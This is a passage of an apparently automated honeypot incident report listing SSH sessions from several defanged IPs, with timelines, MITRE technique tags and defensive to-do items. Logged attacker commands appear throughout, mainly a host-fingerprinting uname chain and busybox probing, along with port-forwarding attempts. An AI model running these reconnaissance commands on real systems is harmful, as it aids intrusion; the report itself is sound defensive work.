| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 08:04:28` | `cowrie.session.connect` |
| `2026-09-04 08:04:30` | `cowrie.client.version` |
| `2026-09-04 08:04:30` | `cowrie.client.kex` |
| `2026-09-04 08:04:45` | `cowrie.login.success` |
| `2026-09-04 08:04:49` | `cowrie.session.params` |
| `2026-09-04 08:04:49` | `cowrie.command.input` |
| `2026-09-04 08:04:49` | `cowrie.command.input` |
| `2026-09-04 08:04:49` | `cowrie.command.input` |
| `2026-09-04 08:04:49` | `cowrie.command.input` |
| `2026-09-04 08:04:49` | `cowrie.command.input` |
| `2026-09-04 08:04:49` | `cowrie.command.success` |
| `2026-09-04 08:04:49` | `cowrie.command.input` |
| `2026-09-04 08:04:49` | `cowrie.command.input` |
| `2026-09-04 08:04:49` | `cowrie.command.input` |
| `2026-09-04 08:04:49` | `cowrie.command.input` |
| `2026-09-04 08:04:49` | `cowrie.log.closed` |
| `2026-09-04 08:04:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcf37edf12e2

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 08:05 |
| **Last Seen** | 2026-09-04 08:05 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 08:05:12` | `cowrie.session.connect` |
| `2026-09-04 08:05:15` | `cowrie.client.version` |
| `2026-09-04 08:05:15` | `cowrie.client.kex` |
| `2026-09-04 08:05:24` | `cowrie.login.success` |
| `2026-09-04 08:05:28` | `cowrie.session.params` |
| `2026-09-04 08:05:28` | `cowrie.command.input` |
| `2026-09-04 08:05:28` | `cowrie.command.input` |
| `2026-09-04 08:05:28` | `cowrie.command.input` |
| `2026-09-04 08:05:28` | `cowrie.command.input` |
| `2026-09-04 08:05:28` | `cowrie.command.input` |
| `2026-09-04 08:05:28` | `cowrie.command.success` |
| `2026-09-04 08:05:28` | `cowrie.command.input` |
| `2026-09-04 08:05:28` | `cowrie.command.input` |
| `2026-09-04 08:05:28` | `cowrie.command.input` |
| `2026-09-04 08:05:28` | `cowrie.command.input` |
| `2026-09-04 08:05:30` | `cowrie.log.closed` |
| `2026-09-04 08:05:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-162e42056e34

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 08:05 |
| **Last Seen** | 2026-09-04 08:06 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 08:05:55` | `cowrie.session.connect` |
| `2026-09-04 08:05:56` | `cowrie.client.version` |
| `2026-09-04 08:05:56` | `cowrie.client.kex` |
| `2026-09-04 08:06:06` | `cowrie.login.success` |
| `2026-09-04 08:06:10` | `cowrie.session.params` |
| `2026-09-04 08:06:10` | `cowrie.command.input` |
| `2026-09-04 08:06:10` | `cowrie.command.input` |
| `2026-09-04 08:06:10` | `cowrie.command.input` |
| `2026-09-04 08:06:10` | `cowrie.command.input` |
| `2026-09-04 08:06:10` | `cowrie.command.input` |
| `2026-09-04 08:06:10` | `cowrie.command.success` |
| `2026-09-04 08:06:10` | `cowrie.command.input` |
| `2026-09-04 08:06:10` | `cowrie.command.input` |
| `2026-09-04 08:06:10` | `cowrie.command.input` |
| `2026-09-04 08:06:10` | `cowrie.command.input` |
| `2026-09-04 08:06:11` | `cowrie.log.closed` |
| `2026-09-04 08:06:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb5183cc098f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 08:06 |
| **Last Seen** | 2026-09-04 08:06 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 08:06:33` | `cowrie.session.connect` |
| `2026-09-04 08:06:35` | `cowrie.client.version` |
| `2026-09-04 08:06:35` | `cowrie.client.kex` |
| `2026-09-04 08:06:46` | `cowrie.login.success` |
| `2026-09-04 08:06:49` | `cowrie.session.params` |
| `2026-09-04 08:06:49` | `cowrie.command.input` |
| `2026-09-04 08:06:50` | `cowrie.command.input` |
| `2026-09-04 08:06:50` | `cowrie.command.input` |
| `2026-09-04 08:06:50` | `cowrie.command.input` |
| `2026-09-04 08:06:50` | `cowrie.command.input` |
| `2026-09-04 08:06:50` | `cowrie.command.success` |
| `2026-09-04 08:06:50` | `cowrie.command.input` |
| `2026-09-04 08:06:50` | `cowrie.command.input` |
| `2026-09-04 08:06:50` | `cowrie.command.input` |
| `2026-09-04 08:06:50` | `cowrie.command.input` |
| `2026-09-04 08:06:50` | `cowrie.log.closed` |
| `2026-09-04 08:06:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-410f07738e4d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 08:07 |
| **Last Seen** | 2026-09-04 08:07 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 08:07:11` | `cowrie.session.connect` |
| `2026-09-04 08:07:12` | `cowrie.client.version` |
| `2026-09-04 08:07:12` | `cowrie.client.kex` |
| `2026-09-04 08:07:23` | `cowrie.login.success` |
| `2026-09-04 08:07:27` | `cowrie.session.params` |
| `2026-09-04 08:07:27` | `cowrie.command.input` |
| `2026-09-04 08:07:27` | `cowrie.command.input` |
| `2026-09-04 08:07:27` | `cowrie.command.input` |
| `2026-09-04 08:07:27` | `cowrie.command.input` |
| `2026-09-04 08:07:27` | `cowrie.command.input` |
| `2026-09-04 08:07:27` | `cowrie.command.success` |
| `2026-09-04 08:07:27` | `cowrie.command.input` |
| `2026-09-04 08:07:27` | `cowrie.command.input` |
| `2026-09-04 08:07:27` | `cowrie.command.input` |
| `2026-09-04 08:07:27` | `cowrie.command.input` |
| `2026-09-04 08:07:28` | `cowrie.log.closed` |
| `2026-09-04 08:07:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8082b979880c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 08:07 |
| **Last Seen** | 2026-09-04 08:08 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 08:07:51` | `cowrie.session.connect` |
| `2026-09-04 08:07:52` | `cowrie.client.version` |
| `2026-09-04 08:07:52` | `cowrie.client.kex` |
| `2026-09-04 08:08:05` | `cowrie.login.success` |
| `2026-09-04 08:08:08` | `cowrie.session.params` |
| `2026-09-04 08:08:08` | `cowrie.command.input` |
| `2026-09-04 08:08:08` | `cowrie.command.input` |
| `2026-09-04 08:08:08` | `cowrie.command.input` |
| `2026-09-04 08:08:08` | `cowrie.command.input` |
| `2026-09-04 08:08:08` | `cowrie.command.input` |
| `2026-09-04 08:08:08` | `cowrie.command.success` |
| `2026-09-04 08:08:08` | `cowrie.command.input` |
| `2026-09-04 08:08:08` | `cowrie.command.input` |
| `2026-09-04 08:08:08` | `cowrie.command.input` |
| `2026-09-04 08:08:08` | `cowrie.command.input` |
| `2026-09-04 08:08:08` | `cowrie.log.closed` |
| `2026-09-04 08:08:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-814163f081d3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 08:08 |
| **Last Seen** | 2026-09-04 08:08 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 08:08:36` | `cowrie.session.connect` |
| `2026-09-04 08:08:38` | `cowrie.client.version` |
| `2026-09-04 08:08:38` | `cowrie.client.kex` |
| `2026-09-04 08:08:44` | `cowrie.login.success` |
| `2026-09-04 08:08:48` | `cowrie.session.params` |
| `2026-09-04 08:08:48` | `cowrie.command.input` |
| `2026-09-04 08:08:48` | `cowrie.command.input` |
| `2026-09-04 08:08:48` | `cowrie.command.input` |
| `2026-09-04 08:08:48` | `cowrie.command.input` |
| `2026-09-04 08:08:48` | `cowrie.command.input` |
| `2026-09-04 08:08:48` | `cowrie.command.success` |
| `2026-09-04 08:08:48` | `cowrie.command.input` |
| `2026-09-04 08:08:48` | `cowrie.command.input` |
| `2026-09-04 08:08:48` | `cowrie.command.input` |
| `2026-09-04 08:08:48` | `cowrie.command.input` |
| `2026-09-04 08:08:49` | `cowrie.log.closed` |
| `2026-09-04 08:08:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-455f519fae9c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 08:09 |
| **Last Seen** | 2026-09-04 08:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 08:09:33` | `cowrie.session.connect` |
| `2026-09-04 08:09:33` | `cowrie.client.version` |
| `2026-09-04 08:09:33` | `cowrie.client.kex` |
| `2026-09-04 08:09:35` | `cowrie.login.success` |
| `2026-09-04 08:09:35` | `cowrie.direct-tcpip.request` |
| `2026-09-04 08:09:35` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 08:09:35` | `cowrie.direct-tcpip.data` |
| `2026-09-04 08:09:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b991cb726a7

| Field | Detail |
|---|---|
| **Source IP** | `193.169.127[.]6` |
| **First Seen** | 2026-09-04 08:15 |
| **Last Seen** | 2026-09-04 08:16 |
| **Session Duration** | 65s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `enable, system, shell, sh, /bin/busybox TOKEN` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 08:15:34` | `cowrie.session.connect` |
| `2026-09-04 08:15:34` | `cowrie.login.success` |
| `2026-09-04 08:15:35` | `cowrie.session.params` |
| `2026-09-04 08:15:35` | `cowrie.command.input` |
| `2026-09-04 08:15:35` | `cowrie.command.failed` |
| `2026-09-04 08:15:36` | `cowrie.command.input` |
| `2026-09-04 08:15:36` | `cowrie.command.failed` |
| `2026-09-04 08:15:37` | `cowrie.command.input` |
| `2026-09-04 08:15:37` | `cowrie.command.failed` |
| `2026-09-04 08:15:38` | `cowrie.command.input` |
| `2026-09-04 08:15:38` | `cowrie.command.input` |
| `2026-09-04 08:15:39` | `cowrie.command.input` |
| `2026-09-04 08:15:39` | `cowrie.command.success` |
| `2026-09-04 08:15:49` | `cowrie.session.file_download.failed` |
| `2026-09-04 08:15:59` | `cowrie.session.file_download.failed` |
| `2026-09-04 08:16:39` | `cowrie.log.closed` |
| `2026-09-04 08:16:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.169.127[.]6` to AbuseIPDB if not already reported
- [ ] Block `193.169.127[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-996dc5fb2a2a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 08:17 |
| **Last Seen** | 2026-09-04 08:17 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 08:17:35` | `cowrie.session.connect` |
| `2026-09-04 08:17:36` | `cowrie.client.version` |
| `2026-09-04 08:17:36` | `cowrie.client.kex` |
| `2026-09-04 08:17:47` | `cowrie.login.success` |
| `2026-09-04 08:17:51` | `cowrie.session.params` |
| `2026-09-04 08:17:51` | `cowrie.command.input` |
| `2026-09-04 08:17:51` | `cowrie.command.input` |
| `2026-09-04 08:17:51` | `cowrie.command.input` |
| `2026-09-04 08:17:51` | `cowrie.command.input` |
| `2026-09-04 08:17:51` | `cowrie.command.input` |
| `2026-09-04 08:17:51` | `cowrie.command.success` |
| `2026-09-04 08:17:51` | `cowrie.command.input` |
| `2026-09-04 08:17:51` | `cowrie.command.input` |
| `2026-09-04 08:17:51` | `cowrie.command.input` |
| `2026-09-04 08:17:51` | `cowrie.command.input` |
| `2026-09-04 08:17:52` | `cowrie.log.closed` |
| `2026-09-04 08:17:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e529e2aa9ede

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 08:18 |
| **Last Seen** | 2026-09-04 08:18 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 08:18:17` | `cowrie.session.connect` |
| `2026-09-04 08:18:19` | `cowrie.client.version` |
| `2026-09-04 08:18:19` | `cowrie.client.kex` |
| `2026-09-04 08:18:29` | `cowrie.login.success` |
| `2026-09-04 08:18:34` | `cowrie.session.params` |
| `2026-09-04 08:18:34` | `cowrie.command.input` |
| `2026-09-04 08:18:34` | `cowrie.command.input` |
| `2026-09-04 08:18:34` | `cowrie.command.input` |
| `2026-09-04 08:18:34` | `cowrie.command.input` |
| `2026-09-04 08:18:34` | `cowrie.command.input` |
| `2026-09-04 08:18:34` | `cowrie.command.success` |
| `2026-09-04 08:18:34` | `cowrie.command.input` |
| `2026-09-04 08:18:34` | `cowrie.command.input` |
| `2026-09-04 08:18:34` | `cowrie.command.input` |
| `2026-09-04 08:18:34` | `cowrie.command.input` |
| `2026-09-04 08:18:34` | `cowrie.log.closed` |
| `2026-09-04 08:18:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c259f2fe6ba2

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 08:18 |
| **Last Seen** | 2026-09-04 08:19 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 08:18:55` | `cowrie.session.connect` |
| `2026-09-04 08:18:57` | `cowrie.client.version` |
| `2026-09-04 08:18:57` | `cowrie.client.kex` |
| `2026-09-04 08:19:10` | `cowrie.login.success` |
| `2026-09-04 08:19:13` | `cowrie.session.params` |
| `2026-09-04 08:19:13` | `cowrie.command.input` |
| `2026-09-04 08:19:13` | `cowrie.command.input` |
| `2026-09-04 08:19:13` | `cowrie.command.input` |
| `2026-09-04 08:19:13` | `cowrie.command.input` |
| `2026-09-04 08:19:13` | `cowrie.command.input` |
| `2026-09-04 08:19:13` | `cowrie.command.success` |
| `2026-09-04 08:19:13` | `cowrie.command.input` |
| `2026-09-04 08:19:13` | `cowrie.command.input` |
| `2026-09-04 08:19:13` | `cowrie.command.input` |
| `2026-09-04 08:19:13` | `cowrie.command.input` |
| `2026-09-04 08:19:14` | `cowrie.log.closed` |
| `2026-09-04 08:19:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd8b2bdfa30c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 08:20 |
| **Last Seen** | 2026-09-04 08:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 08:20:36` | `cowrie.session.connect` |
| `2026-09-04 08:20:36` | `cowrie.client.version` |
| `2026-09-04 08:20:36` | `cowrie.client.kex` |
| `2026-09-04 08:20:37` | `cowrie.login.success` |
| `2026-09-04 08:20:37` | `cowrie.direct-tcpip.request` |
| `2026-09-04 08:20:37` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 08:20:37` | `cowrie.direct-tcpip.data` |
| `2026-09-04 08:20:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d148d129f137

| Field | Detail |
|---|---|
| **Source IP** | `180.76.61[.]232` |
| **First Seen** | 2026-09-04 08:29 |
| **Last Seen** | 2026-09-04 08:34 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 08:29:45` | `cowrie.session.connect` |
| `2026-09-04 08:29:45` | `cowrie.client.version` |
| `2026-09-04 08:29:47` | `cowrie.client.kex` |
| `2026-09-04 08:29:48` | `cowrie.login.success` |
| `2026-09-04 08:34:48` | `cowrie.session.file_upload` |
| `2026-09-04 08:34:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.61[.]232` to AbuseIPDB if not already reported
- [ ] Block `180.76.61[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cc01d661986

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 08:31 |
| **Last Seen** | 2026-09-04 08:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 08:31:43` | `cowrie.session.connect` |
| `2026-09-04 08:31:43` | `cowrie.client.version` |
| `2026-09-04 08:31:44` | `cowrie.client.kex` |
| `2026-09-04 08:31:44` | `cowrie.login.success` |
| `2026-09-04 08:31:45` | `cowrie.direct-tcpip.request` |
| `2026-09-04 08:31:45` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 08:31:45` | `cowrie.direct-tcpip.data` |
